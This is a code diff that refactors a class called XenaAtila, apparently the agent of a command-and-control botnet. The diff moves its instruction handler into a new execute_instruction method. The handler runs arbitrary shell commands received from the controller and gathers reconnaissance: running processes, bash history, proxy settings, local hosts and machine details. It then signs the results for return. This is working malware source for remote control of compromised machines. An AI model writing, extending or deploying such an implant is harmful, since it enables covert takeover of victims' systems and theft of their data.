@@ -71,34 +71,7 @@ class XenaAtila:
       if subject != 'instruction':
         return
 
-      output = str
-      
-      # COMMAND: SHELL
-      if content['shell'] is not None and content['shell'][0] != '/':
-        output = System.do(content['shell'])
-      
-      # COMMAND: GET_BASH_HISTORY
-      if content['shell'] is not None and content['shell'] == '/get processes':
-        processes = ''
-        for ps in System.enumerate_running_processes():
-          processes += 'name: ' + ps['name'] + ', pid: ' + str(ps['pid']) + ', cpu_percent: ' + str(ps['cpu_percent'])  + '\n'
-        output = processes
-
-      # COMMAND: GET_BASH_HISTORY
-      if content['shell'] is not None and content['shell'] == '/get bash history':
-        output = System.get_bash_history_cat()
-
-      # COMMAND: GET_PROXY_SETTINGS
-      if content['shell'] is not None and content['shell'] == '/get proxy settings':
-        output = json.dumps(System.system_proxy_settings())
-
-      # COMMAND: GET_LOCALHOST
-      if content['shell'] is not None and content['shell'] == '/get localhost':
-        output = System.enumerate_local_host()
-
-      # COMMAND: GET_MACHINE_DETAILS
-      if content['shell'] is not None and content['shell'] == '/get machine details':
-        output = json.dumps(System.environment_details())
+      output = self.execute_instruction(content['shell'])
 
       # Sign the response.
       token = jwt.JWT(
@@ -146,5 +119,40 @@ class XenaAtila:
       return False
     
     return True
+  
+  def execute_instruction(self, shell: str):
+    output = str
+
+    if shell is None:
+      return 'INVALID_COMMAND'
+    
+    # COMMAND: SHELL
+    if shell[0] != '/':
+      output = System.do(shell)
+    
+    # COMMAND: GET_BASH_HISTORY
+    if shell == '/get processes':
+      processes = ''
+      for ps in System.enumerate_running_processes():
+        processes += 'name: ' + ps['name'] + ', pid: ' + str(ps['pid']) + ', cpu_percent: ' + str(ps['cpu_percent'])  + '\n'
+      output = processes
+
+    # COMMAND: GET_BASH_HISTORY
+    if shell == '/get bash history':
+      output = System.get_bash_history_cat()
+
+    # COMMAND: GET_PROXY_SETTINGS
+    if shell == '/get proxy settings':
+      output = json.dumps(System.system_proxy_settings())
+
+    # COMMAND: GET_LOCALHOST
+    if shell == '/get localhost':
+      output = System.enumerate_local_host()
+
+    # COMMAND: GET_MACHINE_DETAILS
+    if shell == '/get machine details':
+      output = json.dumps(System.environment_details())
+    
+    return str(output)
 
 xena_atila: XenaAtila = XenaAtila()
